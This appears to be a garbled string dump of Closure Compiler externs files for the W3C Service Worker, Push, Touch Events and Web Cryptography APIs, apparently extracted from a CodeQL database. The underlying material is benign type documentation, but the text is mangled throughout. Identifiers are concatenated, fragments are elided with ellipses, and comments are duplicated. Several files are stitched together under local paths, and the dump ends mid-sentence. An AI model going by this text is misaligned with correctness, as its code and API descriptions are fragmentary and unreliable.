 *   bubbles: (boolean|undefined),
 *   cancelable: (boolean|undefined)
 * }}
 
 * @see http://www.w3.org/TR/service-workers/#install-event-interface
 * @constructor
 * @param {string} type
 * @param {InstallEventInit=} opt_eventInitDict
 * @extends {ExtendableEvent}
 
 * @typedef {{
 *   bubbles: (boolean|undefined),
 *   cancelable: (boolean|undefined),
 *   activeWorker: (!ServiceWorker|undefined)
 * }}
 
 * @see http://www.w3.org/TR/service-workers/#fetch-event-interface
 * @constructor
 * @param {string} type
 * @param {FetchEventInit=} opt_eventInitDict
 * @extends {Event}
  @type {!Request} /** @ty ... est} */ @type {!ServiceWorkerClient}  @type {!boolean} 
 * @param {(Response|Promise<Response>)} r
 * @return {undefined}
 
 * @param {string} url
 * @return {!Promise<!Response>}
 
 * @return {!Promise<!Response>}
 
 * @typedef {{
 *   bubbles: (boolean|undefined),
 *   cancelable: (boolean|undefined),
 *   request: (!Request|undefined),
 *   client: (!ServiceWorkerClient|undefined),
 *   isReload: (!boolean|undefined)
 * }}
 ServiceWorkerServiceWorkerStatePushSubscriptionendpointsubscriptionIdunsubscribePushManagersubscribegetSubscriptionPushSubscriptionOptionsPushMessageDataPushEventServiceWorkerRegistrationinstallingwaitingunregisteronupdatefoundpushManagershowNotificationgetNotificationsopt_filterServiceWorkerContainercontrollergetRegistrationopt_documentURLgetRegistrationsoncontrollerchangeRegistrationOptionsserviceWorkerServiceWorkerGlobalScopescriptCachecachesclientsregistrationskipWaitingoninstallonactivateonfetchonbeforeevictedonevictedServiceWorkerClientfocusedframeTypeServiceWorkerClientsmatchAllclaimopenWindowServiceWorkerClientQueryOptionsCacheopt_requestaddAllCacheQueryOptionsCacheStoragecacheNameExtendableEventwaitUntilExtendableEventInitInstallEventactiveWorkerInstallEventInitFetchEventclientisReloadrespondWithrforwardToFetchEventInitExterns for service worker.
*http://www.w3.org/TR/service-workers/
http://www.w3.org/TR/service-workers/#service-worker-interface
Set of possible string values: 'installing', 'installed', 'activating',
'activated', 'redundant'.https://w3c.github.io/push-api/
Please note there is an intent to deprecate this field in Chrome 43 or 44.
See https://www.chromestatus.com/feature/5283829761703936.!Promise.<boolean>Promise.<boolean>https://w3c.github.io/push-api/#idl-def-PushManager
PushSubscriptionOptions=!Promise.<PushSubscription>Promise.<PushSubscription>!Promise.<PushPermissionStatus>Promise.<PushPermissionStatus>PushPermissionStatus{userVisibleOnly: (boolean|undefined)}https://w3c.github.io/push-api/#idl-def-PushSubscriptionOptionshttp://www.w3.org/TR/push-api/#idl-def-PushMessageData
http://www.w3.org/TR/push-api/#idl-def-PushEvent
!ExtendableEventInit=!ExtendableEventInit?PushMessageDatahttp://www.w3.org/TR/service-workers/#service-worker-registration-interface
!PushManagerhttps://notifications.spec.whatwg.org/#service-worker-api
NotificationOptions=NotificationOptions!GetNotificationOptions=!GetNotificationOptionsGetNotificationOptions!Promise.<?Array.<?Notification>>Promise.<?Array.<?Notification>>?Array.<?Notification>Array.<?Notification>?NotificationNotificationhttp://www.w3.org/TR/service-workers/#service-worker-container-interface
?ServiceWorker!Promise.<!ServiceWorkerRegistration>Promise.<!ServiceWorkerRegistration>!ServiceWorkerRegistrationRegistrationOptions=!Promise.<(!ServiceWorkerRegistration|undefined)>Promise.<(!ServiceWorkerRegistration|undefined)>(!ServiceWorkerRegistration|undefined)!Promise.<Array.<!ServiceWorkerRegistration>>Promise.<Array.<!ServiceWorkerRegistration>>Array.<!ServiceWorkerRegistration>?function (!ErrorEvent)function (!ErrorEvent)!ErrorEvent{scope: (string|undefined), useCache: (boolean|undefined)}useCache!ServiceWorkerContainerhttp://www.w3.org/TR/service-workers/#service-worker-global-scope-interface
!Cache!CacheStorage!ServiceWorkerClients!Console?function (!InstallEvent)function (!InstallEvent)!InstallEvent?function (!ExtendableEvent)function (!ExtendableEvent)!ExtendableEvent?function (!FetchEvent)function (!FetchEvent)!FetchEventTODO(mtragut): This handler should get a custom event in the future.?function (!MessageEvent)function (!MessageEvent)!MessageEventhttp://www.w3.org/TR/service-workers/#service-worker-client-interface
// TODO(mtragut): Possibly replace the type with enum ContextFrameType once
the enum is defined.(!Array.<!Transferable>|undefined)=(!Array.<!Transferable>|undefined)http://www.w3.org/TR/service-workers/#service-worker-clients-interface
Deprecated in Chrome M43+, use matchAll instead. Reference:
https://github.com/slightlyoff/ServiceWorker/issues/610.
TODO(joeltine): Remove when getAll is fully deprecated.ServiceWorkerClientQueryOptions=!Promise.<!Array.<!ServiceWorkerClient>>Promise.<!Array.<!ServiceWorkerClient>>!Array.<!ServiceWorkerClient>Array.<!ServiceWorkerClient>!ServiceWorkerClient!Promise.<!ServiceWorkerClient>Promise.<!ServiceWorkerClient>{includeUncontrolled: (boolean|undefined)}includeUncontrolledhttp://www.w3.org/TR/service-workers/#cache-interface
CacheQueryOptions=!Promise.<(!Response|undefined)>Promise.<(!Response|undefined)>(!Response|undefined)RequestInfo=!Promise.<!Array.<!Response>>Promise.<!Array.<!Response>>!Array.<!Response>Array.<!Response>!Array.<!RequestInfo>Array.<!RequestInfo>!Promise.<!Array.<!Request>>Promise.<!Array.<!Request>>!Array.<!Request>Array.<!Request>{ignoreSearch: (boolean|undefined), ignoreMethod: (boolean|undefined), ignoreVary: (boolean|undefined), prefixMatch: (boolean|undefined), cacheName: (string|undefined)}ignoreSearchignoreMethodignoreVaryprefixMatchhttp://www.w3.org/TR/service-workers/#cache-storage-interface
Window instances have a property called caches which implements CacheStoragehttps://www.w3.org/TR/service-workers/#cache-objects
!Promise.<!Cache>Promise.<!Cache>!Promise.<!Array.<string>>Promise.<!Array.<string>>http://www.w3.org/TR/service-workers/#extendable-event-interface
ExtendableEventInit={bubbles: (boolean|undefined), cancelable: (boolean|undefined)}http://www.w3.org/TR/service-workers/#install-event-interface
InstallEventInit={bubbles: (boolean|undefined), cancelable: (boolean|undefined), activeWorker: (!ServiceWorker|undefined)}(!ServiceWorker|undefined)!ServiceWorkerhttp://www.w3.org/TR/service-workers/#fetch-event-interface
FetchEventInit=!boolean(Response|Promise.<Response>)Promise.<Response>{bubbles: (boolean|undefined), cancelable: (boolean|undefined), request: (!Request|undefined), client: (!ServiceWorkerClient|undefined), isReload: (!boolean|undefined)}(!Request|undefined)(!ServiceWorkerClient|undefined)(!boolean|undefined)Service ... iptURL;Service ... riptURLService ... ototypeService ... .state;Service ... e.stateService ... change;Service ... echangevar Ser ... State ;PushSub ... dpoint;PushSub ... ndpointPushSub ... ototypePushSub ... tionId;PushSub ... ptionIdPushSub ... n() {};PushSub ... on() {}PushSub ... bscribePushMan ... ns) {};PushMan ... ons) {}PushMan ... bscribePushMan ... ototypePushMan ... n() {};PushMan ... on() {}PushMan ... riptionvar Pus ... ptions;PushSub ... OptionsPushMes ... n() {};PushMes ... on() {}PushMes ... yBufferPushMes ... ototypePushMes ... pe.blobPushMes ... pe.jsonPushMes ... pe.textPushEve ... e.data;PushEve ... pe.dataPushEvent.prototypeService ... trationService ... alling;Service ... tallingService ... aiting;Service ... waitingService ... active;Service ... .activeService ... .scope;Service ... e.scopeService ... n() {};Service ... on() {}Service ... egisterService ... efound;Service ... tefoundService ... .updateService ... anager;Service ... ManagerService ... ns) {};Service ... ons) {}Service ... icationService ... er) {};Service ... ter) {}Service ... cationsService ... ntainerService ... roller;Service ... trollerService ... .ready;Service ... e.readyService ... RL) {};Service ... URL) {}functio ... URL) {}Service ... rationsService ... rchangeService ... nerror;Service ... onerrorvar Reg ... ptions;Navigat ... Worker;Navigat ... eWorkerService ... alScopeService ... tCache;Service ... ptCacheService ... caches;Service ... .cachesService ... lients;Service ... clientsService ... ration;Service ... WaitingService ... onsole;Service ... consoleService ... nstall;Service ... installService ... tivate;Service ... ctivateService ... nfetch;Service ... onfetchService ... victed;Service ... evictedService ... essage;Service ... messageService ... exedDB;Service ... dexedDBService ... hidden;Service ... .hiddenService ... ocused;Service ... focusedService ... yState;Service ... tyStateService ... pe.url;Service ... ype.urlService ... meType;Service ... ameTypeService ... fer) {}Service ... MessageService ... e.focusService ... .getAllService ... atchAllService ... e.claimService ... rl) {};Service ... url) {}Service ... nWindowvar Ser ... ptions;Service ... Optionsfunction Cache() {}Cache.p ... ns) {};Cache.p ... ons) {}Cache.p ... e.matchCache.prototypeCache.p ... atchAllCache.p ... st) {};Cache.p ... est) {}Cache.prototype.addfunction(request) {}Cache.p ... ts) {};Cache.p ... sts) {}Cache.p ... .addAllfunctio ... sts) {}Cache.p ... se) {};Cache.p ... nse) {}Cache.prototype.putfunctio ... nse) {}Cache.p ... .deleteCache.prototype.keysvar Cac ... ptions;Window. ... caches;Window. ... .cachesCacheSt ... ns) {};CacheSt ... ons) {}CacheSt ... e.matchCacheSt ... ototypeCacheSt ... me) {};CacheSt ... ame) {}CacheSt ... ype.hasCacheSt ... pe.openCacheSt ... .deleteCacheSt ... n() {};CacheSt ... on() {}CacheSt ... pe.keysExtenda ... (f) {};Extenda ... n(f) {}Extenda ... itUntilExtenda ... ototypefunction(f) {}var Ext ... ntInit;Extenda ... Worker;Extenda ... eWorkervar Ins ... ntInit;FetchEv ... equest;FetchEv ... requestFetchEvent.prototypeFetchEv ... client;FetchEv ... .clientFetchEv ... Reload;FetchEv ... sReloadFetchEv ... (r) {};FetchEv ... n(r) {}FetchEv ... ondWithfunction(r) {}FetchEv ... rl) {};FetchEv ... url) {}FetchEv ... rwardToFetchEv ... n() {};FetchEv ... on() {}FetchEv ... defaultvar FetchEventInit;/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/w3c_touch_event.js
 * @fileoverview Definitions for W3C's Touch Events specification.
 * @see http://www.w3.org/TR/touch-events/
 * @externs
 
 * @typedef {{
 *   identifier: number,
 *   target: !EventTarget,
 *   clientX: (number|undefined),
 *   clientY: (number|undefined),
 *   screenX: (number|undefined),
 *   screenY: (number|undefined),
 *   pageX: (number|undefined),
 *   pageY: (number|undefined),
 *   radiusX: (number|undefined),
 *   radiusY: (number|undefined),
 *   rotationAngle: (number|undefined),
 *   force: (number|undefined)
 * }}
 
 * The Touch class represents a single touch on the surface. A touch is the
 * presence or movement of a finger that is part of a unique multi-touch
 * sequence.
 * @see http://www.w3.org/TR/touch-events/#touch-interface
 * @param {!TouchInitDict} touchInitDict
 * @constructor
 
 * The x-coordinate of the touch's location relative to the window's viewport.
 * @type {number}
 
 * The y-coordinate of the touch's location relative to the window's viewport.
 * @type {number}
 
 * The unique identifier for this touch object.
 * @type {number}
 
 * The x-coordinate of the touch's location in page coordinates.
 * @type {number}
 
 * The y-coordinate of the touch's location in page coordinates.
 * @type {number}
 
 * The x-coordinate of the touch's location in screen coordinates.
 * @type {number}
 
 * The y-coordinate of the touch's location in screen coordinates.
 * @type {number}
 
 * The target of this touch.
 * @type {EventTarget}
 
 * @type {number}
 * @see http://www.w3.org/TR/touch-events-extensions/#widl-Touch-force
 
 * @type {number}
 * @see http://www.w3.org/TR/touch-events-extensions/#widl-Touch-radiusX
 /**\n *  ... usX\n */
 * @type {number}
 * @see http://www.w3.org/TR/touch-events-extensions/#widl-Touch-radiusY
 /**\n *  ... usY\n */
 * @type {number}
 * @see http://www.w3.org/TR/2011/WD-touch-events-20110505/#widl-Touch-rotationAngle
 
 * Creates a new Touch object.
 * @see http://www.w3.org/TR/touch-events/#widl-Document-createTouch-Touch-WindowProxy-view-EventTarget-target-long-identifier-long-pageX-long-pageY-long-screenX-long-screenY
 * @param {Window} view
 * @param {EventTarget} target
 * @param {number} identifier
 * @param {number} pageX
 * @param {number} pageY
 * @param {number} screenX
 * @param {number} screenY
 * @return {Touch}
 /**\n *  ... ch}\n */
 * The TouchList class is used to represent a collection of Touch objects.
 * @see http://www.w3.org/TR/touch-events/#touchlist-interface
 * @constructor
 * @implements {IArrayLike<!Touch>}
 /**\n *  ... h>}\n */
 * The number of Touch objects in this TouchList object.
 * @type {number}
 
 * Returns the Touch object at the given index.
 * @param {number} index
 * @return {?Touch}
 
 * @param {number} identifier
 * @return {?Touch}
 * @see http://www.w3.org/TR/touch-events-extensions/#widl-TouchList-identifiedTouch-Touch-long-identifier
 
 * Creates a new TouchList object.
 * @see http://www.w3.org/TR/touch-events/#widl-Document-createTouchList-TouchList-Touch-touches
 * @param {Array<?Touch>} touches
 * @return {TouchList}
 
 * @record
 * @extends {UIEventInit}
 /**\n *  ... it}\n */ @type {undefined|!Array<?Touch>} /** @ty ... ch>} */
 * The TouchEvent class encapsulates information about a touch event.
 *
 * <p>The system continually sends TouchEvent objects to an application as
 * fingers touch and move across a surface. A touch event provides a snapshot of
 * all touches during a multi-touch sequence, most importantly the touches that
 * are new or have changed for a particular target. A multi-touch sequence
 * begins when a finger first touches the surface. Other fingers may
 * subsequently touch the surface, and all fingers may move across the surface.
 * The sequence ends when the last of these fingers is lifted from the surface.
 * An application receives touch event objects during each phase of any touch.
 * </p>
 *
 * <p>The different types of TouchEvent objects that can occur are:
 * <ul>
 *   <li>touchstart - Sent when a finger for a given event touches the surface.
 *   <li>touchmove - Sent when a given event moves on the surface.
 *   <li>touchend - Sent when a given event lifts from the surface.
 *   <li>touchcancel - Sent when the system cancels tracking for the touch.
 * </ul>
 * TouchEvent objects are combined together to form high-level GestureEvent
 * objects that are also sent during a multi-touch sequence.</p>
 *
 * @see http://www.w3.org/TR/touch-events/#touchevent-interface
 * @param {string} type
 * @param {!TouchEventInit=} opt_eventInitDict
 * @extends {UIEvent}
 * @constructor
 
 * A collection of Touch objects representing all touches associated with this
 * target.
 * @type {TouchList}
 
 * A collection of Touch objects representing all touches that changed in this event.
 * @type {TouchList}
 
 * Specifies the JavaScript method to invoke when the system cancels tracking
 * for the touch.
 * @type {?function(!TouchEvent)}
 
 * Specifies the JavaScript method to invoke when a given event lifts from the
 * surface.
 * @type {?function(!TouchEvent)}
 
 * Specifies the JavaScript method to invoke when a finger for a given event
 * moves on the surface.
 * @type {?function(!TouchEvent)}
 
 * Specifies the JavaScript method to invoke when a finger for a given event
 * touches the surface.
 * @type {?function(!TouchEvent)}
 TouchInitDicttouchInitDictforcerotationAnglecreateTouchidentifiedTouchcreateTouchListTouchEventInitontouchcancelontouchendontouchmoveontouchstartDefinitions for W3C's Touch Events specification.
http://www.w3.org/TR/touch-events/
{identifier: number, target: !EventTarget, clientX: (number|undefined), clientY: (number|undefined), screenX: (number|undefined), screenY: (number|undefined), pageX: (number|undefined), pageY: (number|undefined), radiusX: (number|undefined), radiusY: (number|undefined), rotationAngle: (number|undefined), force: (number|undefined)}The Touch class represents a single touch on the surface. A touch is the
presence or movement of a finger that is part of a unique multi-touch
sequence.http://www.w3.org/TR/touch-events/#touch-interface
!TouchInitDictThe x-coordinate of the touch's location relative to the window's viewport.The y-coordinate of the touch's location relative to the window's viewport.The unique identifier for this touch object.The x-coordinate of the touch's location in page coordinates.The y-coordinate of the touch's location in page coordinates.The x-coordinate of the touch's location in screen coordinates.The y-coordinate of the touch's location in screen coordinates.The target of this touch.http://www.w3.org/TR/touch-events-extensions/#widl-Touch-forcehttp://www.w3.org/TR/touch-events-extensions/#widl-Touch-radiusXhttp://www.w3.org/TR/touch-events-extensions/#widl-Touch-radiusYhttp://www.w3.org/TR/2011/WD-touch-events-20110505/#widl-Touch-rotationAngleCreates a new Touch object.http://www.w3.org/TR/touch-events/#widl-Document-createTouch-Touch-WindowProxy-view-EventTarget-target-long-identifier-long-pageX-long-pageY-long-screenX-long-screenY
The TouchList class is used to represent a collection of Touch objects.http://www.w3.org/TR/touch-events/#touchlist-interface
IArrayLike.<!Touch>!TouchThe number of Touch objects in this TouchList object.Returns the Touch object at the given index.?Touchhttp://www.w3.org/TR/touch-events-extensions/#widl-TouchList-identifiedTouch-Touch-long-identifierCreates a new TouchList object.http://www.w3.org/TR/touch-events/#widl-Document-createTouchList-TouchList-Touch-touches
Array.<?Touch>(undefined|!Array.<?Touch>)!Array.<?Touch>The TouchEvent class encapsulates information about a touch event.

<p>The system continually sends TouchEvent objects to an application as
fingers touch and move across a surface. A touch event provides a snapshot of
all touches during a multi-touch sequence, most importantly the touches that
are new or have changed for a particular target. A multi-touch sequence
begins when a finger first touches the surface. Other fingers may
subsequently touch the surface, and all fingers may move across the surface.
The sequence ends when the last of these fingers is lifted from the surface.
An application receives touch event objects during each phase of any touch.
</p>

<p>The different types of TouchEvent objects that can occur are:
<ul>
<li>touchstart - Sent when a finger for a given event touches the surface.
<li>touchmove - Sent when a given event moves on the surface.
<li>touchend - Sent when a given event lifts from the surface.
<li>touchcancel - Sent when the system cancels tracking for the touch.
</ul>
TouchEvent objects are combined together to form high-level GestureEvent
objects that are also sent during a multi-touch sequence.</p>http://www.w3.org/TR/touch-events/#touchevent-interface
!TouchEventInit=!TouchEventInitA collection of Touch objects representing all touches associated with this
target.A collection of Touch objects representing all touches that changed in this event.Specifies the JavaScript method to invoke when the system cancels tracking
for the touch.?function (!TouchEvent)function (!TouchEvent)!TouchEventSpecifies the JavaScript method to invoke when a given event lifts from the
surface.Specifies the JavaScript method to invoke when a finger for a given event
moves on the surface.Specifies the JavaScript method to invoke when a finger for a given event
touches the surface.var TouchInitDict;Touch.p ... lientX;Touch.p ... clientXTouch.p ... lientY;Touch.p ... clientYTouch.p ... tifier;Touch.p ... ntifierTouch.p ... .pageX;Touch.p ... e.pageXTouch.p ... .pageY;Touch.p ... e.pageYTouch.p ... creenX;Touch.p ... screenXTouch.p ... creenY;Touch.p ... screenYTouch.p ... target;Touch.p ... .targetTouch.p ... .force;Touch.p ... e.forceTouch.p ... radiusXTouch.p ... radiusYTouch.p ... nAngle;Touch.p ... onAngleDocumen ... nY) {};Documen ... enY) {}Documen ... teTouchfunctio ... enY) {}TouchLi ... length;TouchLi ... .lengthTouchList.prototypeTouchLi ... ex) {};TouchLi ... dex) {}TouchLi ... pe.itemTouchLi ... er) {};TouchLi ... ier) {}TouchLi ... edTouchfunctio ... ier) {}Documen ... es) {};Documen ... hes) {}Documen ... uchListfunction(touches) {}TouchEv ... Target;TouchEv ... dTargetTouchEv ... ototypeTouchEv ... ouches;TouchEv ... touchesTouchEv ... TouchesTouchEv ... altKey;TouchEv ... .altKeyTouchEv ... etaKey;TouchEv ... metaKeyTouchEv ... trlKey;TouchEv ... ctrlKeyTouchEv ... iftKey;TouchEv ... hiftKeyElement ... cancel;Element ... hcancelElement ... uchend;Element ... ouchendElement ... chmove;Element ... uchmoveElement ... hstart;Element ... chstart/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/w3c_webcrypto.js
 * @fileoverview Definitions for W3C's Web Cryptography specification
 * http://www.w3.org/TR/webCryptoAPI
 * @externs
 * @author chrismoon@google.com (Chris Moon)
 * This file was created using the best practices as described in:
 *     chrome_extensions.js
 /**\n *  ... .js\n */
 * @const
 * @see http://www.w3.org/TR/webCryptoAPI
 
 * @typedef {?{
 *   name: string
 * }}
 * @see http://www.w3.org/TR/WebCryptoAPI/#algorithm-dictionary
 
 * @typedef {string|!webCrypto.Algorithm}
 * @see http://www.w3.org/TR/WebCryptoAPI/#dfn-AlgorithmIdentifier
 
 * @constructor
 * @see http://www.w3.org/TR/webCryptoAPI/#dfn-CryptoKey
 /**\n *  ... Key\n */
 * @type {string} An enumerated value representing the type of the key, a secret
 *    key (for symmetric algorithm), a public or a private key
 *    (for an asymmetric algorithm).
 /**\n *  ... m).\n */
 * @type {boolean} Determines whether or not the raw keying material may be
 *     exported by the application.
 /**\n *  ... on.\n */
 * @type {!Object} An opaque object representing a particular cipher the key
 *     has to be used with.
 /**\n *  ... th.\n */
 * @type {!Object} Returns the cached ECMAScript object associated with the
 *   usages internal slot, which indicates which cryptographic operations are
 *   permissible to be used with this key.
 /**\n *  ... ey.\n */
 * @typedef {?{
 *   name: string
 * }}
 * @see http://www.w3.org/TR/WebCryptoAPI/#key-algorithm-dictionary-members
 
 * @constructor
 * @see http://www.w3.org/TR/WebCryptoAPI/#dfn-JsonWebKey
 * @see Section 3.1:
 *     https://tools.ietf.org/html/draft-ietf-jose-json-web-key-41
 /**\n *  ... -41\n */
 * @type {string} Identifies the cryptographic algorithm family used with
 *     the key, such as "RSA" or "EC".
 /**\n *  ... C".\n */
 * @type {string} Identifies the intended use of the public key.
 
 * @type {!Array<string>} Identifies the operation(s) that the key is
 *     intended to be used for.
 /**\n *  ... or.\n */
 * @type {string} Identifies the algorithm intended for use with the key.
 
 * @type {boolean} Boolean to be used with kty values.
 
 * @type {string} Identifies the cryptographic curve used with the key.
 
 * @type {string} Contains the x coordinate for the elliptic curve point.
 
 * @type {string} Contains the y coordinate for the elliptic curve point.
 
 * @type {string} Contains the Elliptic Curve private key value.
 
 * @type {string} Contains the modulus value for the RSA public key.
 
 * @type {string} Contains the exponent value for the RSA public key.
 
 * @type {string} Contains the first prime factor.
 
 * @type {string} Contains the second prime factor.
 
 * @type {string} Contains the Chinese Remainder Theorem (CRT) exponent of
 *     the first factor.
 
 * @type {string} Contains the Chinese Remainder Theorem (CRT) exponent of
 *     the second factor.
 
 * @type {string} Contains the Chinese Remainder Theorem (CRT) coefficient
 *     of the second factor.
 
 * @type {!Array<!webCrypto.RsaOtherPrimesInfo>} Contains an array of
 *     information about any third and subsequent primes, should they exist.
 /**\n *  ... st.\n */
 * @type {string} Contains the value of the symmetric (or other
 *     single-valued) key.
 
 * @constructor
 * @see http://www.w3.org/TR/WebCryptoAPI/#dfn-RsaOtherPrimesInfo
 * @see Section-6.3.2.7:
 *     https://tools.ietf.org/html/draft-ietf-jose-json-web-algorithms-40
 /**\n *  ... -40\n */
 * @type {string} Parameter within an "oth" array member represents the value
 *     of a subsequent prime factor.
 
 * @type {string} Parameter within an "oth" array member represents the CRT
 *     exponent of the corresponding prime factor.
 
 * @type {string} Parameter within an "oth" array member represents the CRT
 *     coefficient of the corresponding prime factor.
 
 * @constructor
 * @see http://www.w3.org/TR/WebCryptoAPI/#subtlecrypto-interface
 
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: AES-CBC, AES-CTR, AES-GCM, and RSA-OAEP.
 * @param {!webCrypto.CryptoKey} key Key to be used for signing.
 * @param {!BufferSource} data Data to be encrypted (cleartext).
 * @return {!Promise<*>} Ciphertext generated by the encryption of the
 *     cleartext.
 /**\n *  ... xt.\n */
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: AES-CBC, AES-CTR, AES-GCM, and RSA-OAEP.
 * @param {!webCrypto.CryptoKey} key Key to be used for signing.
 * @param {!BufferSource} data Data to be decrypted (ciphertext).
 * @return {!Promise<*>} Cleartext generated by the decryption of the
 *     ciphertext.
 
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: HMAC, RSASSA-PKCS1-v1_5, and ECDSA.
 * @param {!webCrypto.CryptoKey} key Private key to be used for signing.
 * @param {!BufferSource} data Data to be signed.
 * @return {!Promise<*>} Returns the signature on success.
 /**\n *  ... ss.\n */
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: HMAC, RSASSA-PKCS1-v1_5, and ECDSA.
 * @param {!webCrypto.CryptoKey} key Private key to be used for signing.
 * @param {!BufferSource} signature Signature to verify.
 * @param {!BufferSource} data Data whose signature needs to be verified.
 * @return {!Promise<*>} Returns a boolean indicating if the signature operating
 *     has been successful.
 /**\n *  ... ul.\n */
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: SHA-1, SHA-256, SHA-384, and SHA-512.
 * @param {!BufferSource} data Data to be hashed using the hashing algorithm.
 * @return {!Promise<*>} returns the hash on success.
 
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: SHA-1, SHA-256, SHA-384, and SHA-512.
 * @param {boolean} extractable If the key can be extracted from the CryptoKey
 *     object at a later stage.
 * @param {!Array<string>} keyUsages Indication of new key options i.e.
 *     encrypt, decrypt, sign, verify, deriveKey, deriveBits, wrapKey,
 *     unwrapKey.
 * @return {!Promise<*>} returns the generated key as a CryptoKey or a
 *     CryptoKeyPair.
 /**\n *  ... ir.\n */
 * @param {!webCrypto.AlgorithmIdentifier} algorithm The key derivation
 *     algorithm to use. Supported values are:  ECDH, DH, PBKDF2, and HKDF-CTR.
 * @param {!webCrypto.CryptoKey} baseKey Key to be used by the key
 *     derivation algorithm.
 * @param {!webCrypto.AlgorithmIdentifier} derivedKeyAlgo Defines the key
 *     derivation algorithm to use.
 * @param {boolean} extractable Indicates if the key can be extracted from the
 *     CryptoKey object at a later stage.
 * @param {!Array<string>} keyUsages Indicates what can be done with the
 *     derivated key.
 * @return {!Promise<*>} returns the generated key as a CryptoKey or a
 *     CryptoKeyPair.
 
 * @param {!webCrypto.AlgorithmIdentifier} algorithm The key derivation
 *     algorithm to use.
 * @param {!webCrypto.CryptoKey} baseKey Key to be used by the key
 *     derivation algorithm.
 * @param {number} length
 * @return {!Promise<*>} returns the generated key as a CryptoKey or a
 *     CryptoKeyPair.
 
 * @param {string} format Enumerated value describing the data
 *     format of the key to imported.
 * @param {!BufferSource|!webCrypto.JsonWebKey} keyData The key
 *     in the given format.
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported values
 *     are: AES-CTR, AES-CBC, AES-GCM, RSA-OAEP, AES-KW, HMAC,
 *     RSASSA-PKCS1-v1_5, ECDSA, ECDH, DH.
 * @param {boolean} extractable If the key can be extracted from the CryptoKey
 *     object at a later stage.
 * @param {!Array<string>} keyUsages Indication of new key options i.e.
 *     encrypt, decrypt, sign, verify, deriveKey, deriveBits, wrapKey,
 *     unwrapKey.
 * @return {!Promise<*>} returns the generated key as a CryptoKey.
 
 * @param {string} format Enumerated value describing the data
 *     format of the key to imported.
 * @param {!webCrypto.CryptoKey} key CryptoKey to export.
 * @return {!Promise<*>} returns the key in the requested format.
 /**\n *  ... at.\n */
 * @param {string} format Value describing the data format in which the key must
 *     be wrapped. It can be one of the following: raw, pkcs8, spki, jwk.
 * @param {!webCrypto.CryptoKey} key CryptoKey to wrap.
 * @param {!webCrypto.CryptoKey} wrappingKey CryptoKey used to perform
 *     the wrapping.
 * @param {!webCrypto.AlgorithmIdentifier} wrapAlgorithm algorithm used
 *     to perform the wrapping. It is one of the following: AES-CBC, AES-CTR,
 *     AES-GCM, RSA-OAEP, and AES-KW.
 * @return {!Promise<*>} returns the wrapped key in the requested format.
 
 * @param {string} format Value describing the data format in which the key must
 *     be wrapped. It can be one of the following: raw, pkcs8, spki, jwk.
 * @param {!BufferSource} wrappedKey Contains the wrapped key in the given
 *     format.
 * @param {!webCrypto.CryptoKey} unwrappingKey CryptoKey used to perform
 *     the unwrapping.
 * @param {!webCrypto.AlgorithmIdentifier} unwrapAlgorithm Algorithm
 *    used to perform the unwrapping. It is one of the following: AES-CBC,
 *    AES-CTR, AES-GCM, RSA-OAEP, and AES-KW.
 * @param {!webCrypto.AlgorithmIdentifier} unwrappedKeyAlgorithm
 *     Represents the algorithm of the wrapped key.
 * @param {boolean} extractable Indicates if the key can be extracted from the
 *     CryptoKey object at a later stage.
 * @param {!Array<string>} keyUsages Indicates what can be done with the
 *     derivated key.
 * @return {!Promise<*>} returns the unwrapped key as a CryptoKey.
 
 * Web Cryptography API
 * @see http://www.w3.org/TR/WebCryptoAPI/
 /**\n *  ... PI/\n */
 * @see https://developer.mozilla.org/en/DOM/window.crypto.getRandomValues
 * @param {!ArrayBufferView} typedArray
 * @return {!ArrayBufferView}
 * @throws {Error}
 
 * @type {webCrypto.SubtleCrypto}
 * @see http://www.w3.org/TR/WebCryptoAPI/#Crypto-attribute-subtle
 webCryptoAlgorithmAlgorithmIdentifierCryptoKeyextractableusagesKeyAlgorithmJsonWebKeyktyusekey_opsalgcrvdqdpdqqiothkRsaOtherPrimesInfotSubtleCryptoencryptdecryptgenerateKeykeyUsagesderiveKeybaseKeyderivedKeyAlgoderiveBitsimportKeykeyDataexportKeywrapKeywrappingKeywrapAlgorithmunwrapKeywrappedKeyunwrappingKeyunwrapAlgorithmunwrappedKeyAlgorithmgetRandomValuestypedArraysubtleDefinitions for W3C's Web Cryptography specification
http://www.w3.org/TR/webCryptoAPI
chrismoon@google.com (Chris Moon)
This file was created using the best practices as described in:
chrome_extensions.jshttp://www.w3.org/TR/webCryptoAPI?{name: string}{name: string}http://www.w3.org/TR/WebCryptoAPI/#algorithm-dictionary(string|!webCrypto.Algorithm)!webCrypto.AlgorithmwebCrypto.Algorithmhttp://www.w3.org/TR/WebCryptoAPI/#dfn-AlgorithmIdentifierhttp://www.w3.org/TR/webCryptoAPI/#dfn-CryptoKeyAn enumerated value representing the type of the key, a secret
key (for symmetric algorithm), a public or a private key
(for an asymmetric algorithm).Determines whether or not the raw keying material may be
exported by the application.An opaque object representing a particular cipher the key
has to be used with.Returns the cached ECMAScript object associated with the
usages internal slot, which indicates which cryptographic operations are
permissible to be used with this key.http://www.w3.org/TR/WebCryptoAPI/#key-algorithm-dictionary-membershttp://www.w3.org/TR/WebCryptoAPI/#dfn-JsonWebKey
Section 3.1:
https://tools.ietf.org/html/draft-ietf-jose-json-web-key-41Identifies the cryptographic algorithm family used with
the key, such as "RSA" or "EC".Identifies the intended use of the public key.Identifies the operation(s) that the key is
intended to be used for.Identifies the algorithm intended for use with the key.Boolean to be used with kty values.Identifies the cryptographic curve used with the key.Contains the x coordinate for the elliptic curve point.Contains the y coordinate for the elliptic curve point.Contains the Elliptic Curve private key value.Contains the modulus value for the RSA public key.Contains the exponent value for the RSA public key.Contains the first prime factor.Contains the second prime factor.Contains the Chinese Remainder Theorem (CRT) exponent of
the first factor.Contains the Chinese Remainder Theorem (CRT) exponent of
the second factor.Contains the Chinese Remainder Theorem (CRT) coefficient
of the second factor.Contains an array of
